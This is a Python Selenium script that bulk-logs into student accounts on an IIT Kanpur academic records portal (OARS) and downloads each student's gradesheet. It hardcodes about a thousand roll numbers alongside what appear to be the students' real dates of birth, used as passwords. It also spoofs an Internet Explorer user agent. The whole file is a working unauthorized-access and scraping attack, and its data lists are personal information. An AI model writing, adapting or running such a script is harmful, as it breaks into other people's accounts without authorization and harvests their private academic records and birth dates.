# Downloads raw html of gradesheets from OARS

import os
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from fake_useragent import UserAgent

cwd = os.getcwd()
print(cwd)

roll = ['190001','190002','190003','190004','190005','190006','190007','190008','190009','190010','190011','190012','190013','190014','190015','190016','190017','190018','190019','190020','190021','190022','190023','190024','190025','190026','190027','190028','190029','190030','190031','190032','190033','190034','190035','190036','190037','190038','190039','190040','190041','190042','190043','190044','190045','190046','190047','190048','190049','190050','190051','190052','190053','190054','190055','190056','190057','190058','190059','190060','190061','190062','190063','190064','190065','190066','190067','190068','190069','190070','190071','190072','190073','190074','190075','190076','190077','190078','190079','190080','190081','190082','190083','190084','190085','190086','190087','190088','190089','190090','190091','190092','190093','190094','190095','190096','190097','190098','190099','190100','190101','190102','190103','190104','190105','190106','190107','190108','190109','190110','190111','190112','190113','190114','190115','190116','190117','190118','190119','190120','190121','190122','190123','190124','190125','190126','190127','190128','190129','190130','190131','190132','190133','190134','190135','190136','190137','190138','190139','190140','190141','190142','190143','190144','190145','190146','190147','190148','190149','190150','190151','190152','190153','190154','190155','190156','190157','190158','190159','190160','190161','190162','190163','190164','190165','190166','190167','190168','190169','190170','190171','190172','190173','190174','190175','190176','190177','190178','190179','190180','190181','190182','190183','190184','190185','190186','190187','190188','190189','190190','190191','190192','190193','190194','190195','190196','190197','190198','190199','190200','190201','190202','190203','190204','190205','190206','190207','190208','190209','190210','190211','190212','190213','190214','190215','190216','190217','190218','190219','190220','190221','190222','190223','190224','190225','190226','190227','190228','190229','190230','190231','190232','190233','190234','190235','190236','190237','190238','190239','190240','190241','190242','190243','190244','190245','190246','190247','190248','190249','190250','190251','190252','190253','190254','190255','190256','190257','190258','190259','190260','190261','190262','190263','190264','190265','190266','190267','190268','190269','190270','190271','190272','190273','190274','190275','190276','190277','190278','190279','190280','190281','190282','190283','190284','190285','190286','190287','190288','190289','190290','190291','190292','190293','190294','190295','190296','190297','190298','190299','190300','190301','190302','190303','190304','190305','190306','190307','190308','190309','190310','190311','190312','190313','190314','190315','190316','190317','190318','190319','190320','190321','190322','190323','190324','190325','190326','190327','190328','190329','190330','190331','190332','190333','190334','190335','190336','190337','190338','190339','190340','190341','190342','190343','190344','190345','190346','190347','190348','190349','190350','190351','190352','190353','190354','190355','190356','190357','190358','190359','190360','190361','190362','190363','190364','190365','190366','190367','190368','190369','190370','190371','190372','190373','190374','190375','190376','190377','190378','190379','190380','190381','190382','190383','190384','190385','190386','190387','190388','190389','190390','190391','190392','190393','190394','190395','190396','190397','190398','190399','190400','190401','190402','190403','190404','190405','190406','190407','190408','190409','190410','190411','190412','190413','190414','190415','190416','190417','190418','190419','190420','190421','190422','190423','190424','190425','190426','190427','190428','190429','190430','190431','190432','190433','190434','190435','190436','190437','190438','190439','190440','190441','190442','190443','190444','190445','190446','190447','190448','190449','190450','190451','190452','190453','190454','190455','190456','190457','190458','190459','190460','190461','190462','190463','190464','190465','190466','190467','190468','190469','190470','190471','190472','190473','190474','190475','190476','190477','190478','190479','190480','190481','190482','190483','190484','190485','190486','190487','190488','190489','190490','190491','190492','190493','190494','190495','190496','190497','190498','190499','190500','190501','190502','190503','190504','190505','190506','190507','190508','190509','190510','190511','190512','190513','190514','190515','190516','190517','190518','190519','190520','190521','190522','190523','190524','190525','190526','190527','190528','190529','190530','190531','190532','190533','190534','190535','190536','190537','190538','190539','190540','190541','190542','190543','190544','190545','190546','190547','190548','190549','190550','190551','190552','190553','190554','190555','190556','190557','190558','190559','190560','190561','190562','190563','190564','190565','190566','190567','190568','190569','190570','190571','190572','190573','190574','190575','190576','190577','190578','190579','190580','190581','190582','190583','190584','190585','190586','190587','190588','190589','190590','190591','190592','190593','190594','190595','190596','190597','190598','190599','190600','190601','190602','190603','190604','190605','190606','190607','190608','190609','190610','190611','190612','190613','190614','190615','190616','190617','190618','190619','190620','190621','190622','190623','190624','190625','190626','190627','190628','190629','190630','190631','190632','190633','190634','190635','190636','190637','190638','190639','190640','190641','190642','190643','190644','190645','190646','190647','190648','190649','190650','190651','190652','190653','190654','190655','190656','190657','190658','190659','190660','190661','190662','190663','190664','190665','190666','190667','190668','190669','190670','190671','190672','190673','190674','190675','190676','190677','190678','190679','190680','190681','190682','190683','190684','190685','190686','190687','190688','190689','190690','190691','190692','190693','190694','190695','190696','190697','190698','190699','190700','190701','190702','190703','190704','190705','190706','190707','190708','190709','190710','190711','190712','190713','190714','190715','190716','190717','190718','190719','190720','190721','190722','190723','190724','190725','190726','190727','190728','190729','190730','190731','190732','190733','190734','190735','190736','190737','190738','190739','190740','190741','190742','190743','190744','190745','190746','190747','190748','190749','190750','190751','190752','190753','190754','190755','190756','190757','190758','190759','190760','190761','190762','190763','190764','190765','190766','190767','190768','190769','190770','190771','190772','190773','190774','190775','190776','190777','190778','190779','190780','190781','190782','190783','190784','190785','190786','190787','190788','190789','190790','190791','190792','190793','190794','190795','190796','190797','190798','190799','190800','190801','190802','190803','190804','190805','190806','190807','190808','190809','190810','190811','190812','190813','190814','190815','190816','190817','190818','190819','190820','190821','190822','190823','190824','190825','190826','190827','190828','190829','190830','190831','190832','190833','190834','190835','190836','190837','190838','190839','190840','190841','190842','190843','190844','190845','190846','190847','190848','190849','190850','190851','190852','190853','190854','190855','190856','190857','190858','190859','190860','190861','190862','190863','190864','190865','190866','190867','190868','190869','190870','190871','190872','190873','190874','190875','190876','190877','190878','190879','190880','190881','190882','190883','190884','190885','190886','190887','190888','190889','190890','190891','190892','190893','190894','190895','190896','190897','190898','190899','190900','190901','190902','190903','190904','190905','190906','190907','190908','190909','190910','190911','190912','190913','190914','190915','190916','190917','190918','190919','190920','190921','190922','190923','190924','190925','190926','190927','190928','190929','190930','190931','190932','190933','190934','190935','190936','190937','190938','190939','190940','190941','190942','190943','190944','190945','190946','190947','190948','190949','190950','190951','190952','190953','190954','190955','190956','190957','190958','190959','190960','190961','190962','190963','190964','190965','190966','190967','190968','190969','190970','190971','190972','190973','190974','190975','190976','190977','190978','190979','190980','190981','190982','190983','190984','190985','190986','190987','190988','190989','190990','190991','190992','190993','190994','190995','190996','190997','190998','190999','191000', '191075', '191076', '191077', '191078', '191079', '191080', '191081']
dob = ['14072002', '27052000', '13102000', '30102000', '04022002', '23042000', '17012002', '11012001', '01042000', '04012002', '19032001', '06122001', '23052001', '17092001', '27102001', '16042001', '01082002', '07032001', '13052000', '12062001', '10032000', '05052001', '12042002', '20012000', '12122001', '16112001', '04022002', '11082001', '08092001', '21072001', '28022001', '13012001', '22082001', '21072000', '02112001', '18111999', '09022001', '19102000', '01072000', '30032002', '29091999', '26082000', '25052000', '29072001', '23122001', '30072001', '01082000', '15052002', '12092002', '20052000', '09122001', '01052002', '25082001', '12012002', '19032002', '15032001', '25112000', '15012002', '20012000', '30102000', '20102003', '23062001', '02062001', '19062002', '28092001', '28102001', '02012001', '25042002', '04112001', '03042001', '25012002', '29062000', '12032002', '25022000', '30112001', '26082002', '01072001', '01022004', '19082002', '12062001', '25122000', '02072001', '12122001', '24032001', '16092000', '06122001', '10092001', '04072001', '20032001', '27072001', '05112000', '28032000', '18082001', '25072001', '24102000', '21122000', '28082001', '01032001', '08012002', '10052000', '25122001', '22092001', '16062001', '03102000', '25022002', '29092000', '08022002', '20092000', '14082001', '22042002', '07062000', '20071999', '12112001', '15111999', '15082001', '18092001', '22082001', '29102001', '15082002', '03062001', '17022001', '20102001', '11072001', '13111999', '07012002', '19032002', '07012002', '16102000', '24042001', '02072002', '05012001', '14072001', '16072001', '21012001', '01082001', '31082002', '09082002', '07042000', '20042001', '14062002', '25112002', '06102001', '22102001', '06121999', '10041999', '26082001', '02032002', '22062001', '18092000', '01092001', '04062001', '22082000', '08072000', '19042002', '28112001', '03022002', '28062001', '17062001', '30012001', '17062001', '18091999', '08062000', '17042001', '27052001', '02042002', '14102001', '24022001', '22102001', '08082000', '22102000', '03072001', '05012000', '25042001', '02072001', '19032001', '17012002', '15072001', '02112000', '04072001', '08092001', '13012002', '12032001', '24112001', '01012002', '26012002', '11042002', '27102000', '06022001', '19072001', '30102002', '19032002', '12122001', '30062000', '02022001', '14022001', '10072001', '17082001', '19082001', '20112000', '02082001', '22012001', '18012000', '08082001', '01012001', '03072001', '01042001', '06071999', '10012001', '29092000', '15052000', '03042000', '12092001', '01082001', '04032001', '11092001', '27082001', '22012002', '07052002', '25052001', '11072002', '03022002', '05072001', '22122000', '04042001', '12062002', '06062001', '29112001', '21022002', '12082001', '01012001', '27022001', '11012001', '23102001', '17122001', '02052002', '18092001', '25082001', '26072000', '21052001', '19062002', '09062002', '20032001', '27072001', '26032001', '25122001', '31012003', '11052002', '02012002', '09112001', '25122000', '10062001', '09082001', '18062001', '03112000', '06012002', '06072001', '26062001', '01122000', '02112000', '29082001', '30082001', '24022001', '14092000', '22012002', '14112001', '23102001', '19052001', '09102001', '20102001', '30102001', '17012002', '20122000', '12012002', '25022001', '15012001', '04022002', '10092001', '13101999', '25112001', '28062000', '02082000', '23112001', '06012001', '18092001', '29112000', '01012004', '16032000', '15082000', '02082001', '10122000', '19022001', '21102000', '03032001', '22012001', '29112000', '04012000', '19022000', '06062002', '14022002', '10111999', '03042002', '15122001', '10102002', '13072001', '07112000', '12072001', '15072001', '14051999', '05042002', '01092001', '02042002', '10012001', '25072001', '19052001', '16062001', '23072001', '19012002', '14092000', '23082001', '21072000', '04122001', '19082001', '29042002', '28042001', '21072000', '29082001', '19122001', '22022001', '11022000', '31082001', '29082002', '28112001', '22022001', '20022002', '30101999', '19102000', '10062002', '14072001', '29092001', '12062001', '05102001', '25052001', '01121999', '10092000', '28092001', '12012002', '04072002', '09092000', '27052002', '05032002', '27032002', '01071999', '05122001', '04082000', '16032000', '18082001', '13072001', '10012002', '23092000', '23012001', '10122001', '21052000', '17072002', '12102001', '20012002', '02042001', '19052003', '06102000', '23082001', '03072000', '17122000', '31072000', '05062000', '06122001', '17112000', '23102001', '05022002', '26031999', '05102001', '27012002', '11101999', '28082001', '13032000', '25082002', '28022001', '21052002', '24012002', '24052001', '20052001', '14072001', '29072000', '25121999', '08112001', '18022000', '20052001', '09092000', '01052001', '07092002', '13082000', '07082002', '31082001', '29122001', '07042002', '26012002', '20022001', '01012002', '03052002', '14012002', '30012002', '13042002', '31082001', '24052000', '25052000', '27042001', '10012002', '13052002', '10032002', '16112001', '20112001', '20022001', '25082001', '20012000', '20062001', '07102000', '13122001', '21102001', '15112000', '28032002', '15071999', '21112001', '24022002', '04082001', '22032002', '02092001', '24072002', '22062001', '20072003', '13082001', '21032003', '12012001', '02052002', '23022002', '10112001', '25042002', '02092003', '28072002', '27012002', '09102000', '29101999', '31122001', '08102000', '16042001', '11112001', '22052002', '01032001', '20072000', '22012002', '08122000', '18032002', '21082001', '24032001', '30112000', '06092001', '22052002', '19042000', '03052001', '01052001', '23012002', '24012001', '06012001', '10022002', '15102001', '05082001', '04032000', '06022001', '12102001', '15052001', '18122000', '18011999', '17022001', '03072001', '26092000', '16092001', '14102001', '03082002', '29072000', '25032002', '21102001', '13102000', '13102001', '31101999', '04062001', '17052001', '23072001', '14042002', '07112001', '23122000', '28092001', '10092001', '22052001', '17022001', '01022000', '15092002', '01122000', '15072001', '19062000', '27082001', '10112001', '25012001', '06042001', '07032002', '30032001', '16022000', '02022001', '17062001', '29072000', '21032001', '07122000', '13012001', '14122001', '18112001', '02022001', '26112000', '15032001', '26122001', '29052001', '16112001', '10062001', '19012001', '13102001', '20012002', '23092001', '01112001', '26052004', '25082001', '04032002', '23092001', '11022001', '19092001', '05032001', '10092001', '19032001', '06022002', '07032000', '05122000', '12052002', '05032002', '12012000', '23112000', '07012001', '31012000', '20092002', '05052001', '27062001', '21092002', '06092001', '03102001', '29082001', '06121999', '15112001', '03102001', '14092001', '20082000', '14042002', '03112000', '08082001', '15032001', '09122000', '27042000', '19052000', '05092001', '11042001', '12082000', '02012000', '02022001', '02062001', '06042001', '12082000', '12102002', '26092000', '26092001', '18092001', '25072001', '27052001', '20102000', '15072001', '17072000', '15102001', '12112000', '22082001', '22112001', '06052001', '02082001', '24082001', '03121999', '17032001', '26102001', '06092001', '18012002', '06042001', '25032002', '08102001', '01062002', '23012002', '21062001', '20082002', '12092002', '26022001', '10042001', '09102000', '22082001', '03082000', '06051999', '19062001', '16022001', '20042001', '11042002', '17062000', '30042000', '10032001', '14012000', '29072001', '29032002', '13012001', '23072001', '29092001', '15012001', '11082001', '23022001', '12092001', '12092001', '25122001', '19022000', '09122000', '27012001', '28102001', '22112001', '19032001', '22112000', '12102001', '05112000', '15082001', '26122000', '24042001', '18052000', '15082001', '03122000', '28012001', '18082001', '25042001', '10012002', '07102001', '05062001', '05082000', '21072001', '30092001', '06072002', '06102001', '26032001', '15052001', '25082000', '02082000', '09072002', '29012002', '01062001', '29092001', '15012002', '16112001', '10112001', '25122002', '07012001', '12122001', '09072000', '15082001', '05082002', '15112001', '17102001', '07091999', '11082000', '24052002', '18092001', '14122000', '28092003', '25112001', '26012001', '01092001', '03042001', '01102000', '05072003', '03012001', '20082001', '06082000', '20101999', '09052001', '17062001', '01042001', '18032002', '05102000', '22062001', '09022000', '22112000', '29012001', '18022000', '11062000', '12032001', '25032001', '03092000', '05082000', '30092000', '26012001', '17012001', '15052001', '04012001', '27022001', '04012001', '30092000', '30092000', '08072001', '10092001', '10092001', '02012000', '31072000', '10072000', '29072001', '01022002', '06082001', '23062001', '13022001', '15082000', '27042001', '17062001', '21052002', '28052002', '01022003', '12112002', '25062001', '02012002', '24062001', '25032001', '24052002', '13022001', '26042001', '05082001', '12032001', '03052001', '11102000', '24042002', '28052001', '05052001', '08101999', '17022002', '08112001', '01022001', '26122001', '13102000', '26032000', '10122001', '30092002', '27082001', '24022002', '01102001', '18012002', '24112001', '20092001', '13032002', '10082002', '25102002', '07052001', '07032001', '29092001', '25101999', '24102001', '12122000', '16062001', '14022002', '15071999', '26022001', '05082001', '03072001', '20012001', '14022001', '16042001', '10022000', '02022002', '05062002', '21022001', '06032000', '16122000', '17012002', '04022000', '25082002', '21112001', '27012000', '31012001', '13102001', '06052000', '20042001', '12072000', '30102001', '13062000', '05122001', '25112001', '15012001', '07072001', '07032001', '18042001', '09102001', '24092001', '15072002', '30092001', '30042001', '21052002', '02122000', '10102001', '06102002', '16112000', '25092000', '17082001', '23112001', '28042000', '30072001', '12022001', '05052001', '03052001', '20092001', '15032001', '25092001', '10122001', '29092002', '03092001', '24022000', '10102000', '11102004', '14102001', '13072001', '27072000', '05062001', '15092000', '18092002', '14012002', '18012000', '11072001', '20082000', '20092000', '03052001', '22022001', '27102001', '21072001', '30012001', '19022002', '04122000', '04062000', '13072000', '24112001', '25082001', '04062001', '08042003', '21092000', '27012001', '29062002', '15122001', '22052002', '07072001', '19091999', '23041999', '05102001', '02042000', '10062002', '27022002', '28062001', '21112001', '02092001', '13091999', '30032000', '13032000', '22102001', '15012000', '05082002', '20022001', '18092000', '23012001', '08052001', '09071999', '28112000', '07072001', '18092000', '31082001', '01072001', '11092001', '28102000', '06111999', '19012001', '29102000', '06072001', '21122000', '18072000', '30042002', '01072001', '19102001', '09092001', '18012001', '02012002', '13011999', '19012001', '05092001', '24032001', '05052000', '06092000', '26082001', '27102001', '02092001', '28112000', '08121999', '10062002', '14022001', '20081999', '24052000', '28072001', '03022001', '26012002', '21102000', '06072000', '20092001', '01082001', '11122001', '27082001', '06102001', '19062001', '15092001', '18072001', '30062000', '15072003', '16122001', '09092002', '03032000', '12012000', '23052002', '08092001', '02122001', '23112001', '15052002', '21022000', '07032000', '29062003', '03082002', '28012001', '25012002', '09032000', '25012002', '26092000', '04112003', '14112000', '20102000', '05082001', '01122001', '18072002', '28122001', '07072001', '10092001', '23122001', '15102001', '25102002', '04052002', '13112001', '17102002', '23061999', '10072001', '14032002', '18092001', '26092000', '06102001', '28122001', '21072002', '13122001', '12112000', '11012002', '29112001', '07022003', '17072000', '10022001', '15122003', '08102001', '07072000', '23042001', '27012000', '09102000', '03122002', '28032001', '24072001', '16022002', '24052001', '14022000', '19092001', '03112000', '11072000', '09122000', '27062001', '24092001', '02022000', '26052000', '03072001', '15072001', '09082001', '06102000', '18022001', '16062000', '04082001']

options = Options()
ua = UserAgent()
userAgent = ua.msie
print(userAgent)
options.add_argument(f'user-agent={userAgent}')
driver = webdriver.Chrome(options = options, executable_path = cwd + '/chromedriver')

for i in range(1007):
    driver.get("http://oars2.cc.iitk.ac.in:6060/login.asp")
    main_page = driver.current_window_handle
    driver.find_element_by_name('LoginID').send_keys(roll[i])
    driver.find_element_by_name('Password').send_keys(dob[i])
    driver.find_element_by_name('loginForm').click()
    try:
        driver.switch_to.alert.accept()
        if driver.current_url == 'http://oars2.cc.iitk.ac.in:6060/Student/Default.asp':
            for handle in driver.window_handles:
                if handle != main_page:
                    login_page = handle
                    break
            driver.switch_to.window(login_page)
            driver.close()
            driver.switch_to.window(main_page)
            driver.get('http://oars2.cc.iitk.ac.in:6060/Student/studentgrdcpi.asp?menu=91')
            html = driver.page_source
            if i < 1000:
            	file = open('./Gradesheets/' + str(190001 + i) + '.html', 'w')
            else:
            	file = open('./Gradesheets/' + str(190075 + i) + '.html', 'w')
            file.write(html)
            file.close()
            driver.get("http://oars2.cc.iitk.ac.in:6060/common/logout.asp")
            if i < 1000:
            	print(str(190001 + i) + " successful!")
            else:
            	print(str(190075 + i) + " successful!")
        else:
            if i < 1000:
            	print(str(190001 + i) + " failed!")
            else:
            	print(str(190075 + i) + " failed!")
    except:
        if i < 1000:
        	print(str(190001 + i) + " failed!")
        else:
            print(str(190075 + i) + " failed!")
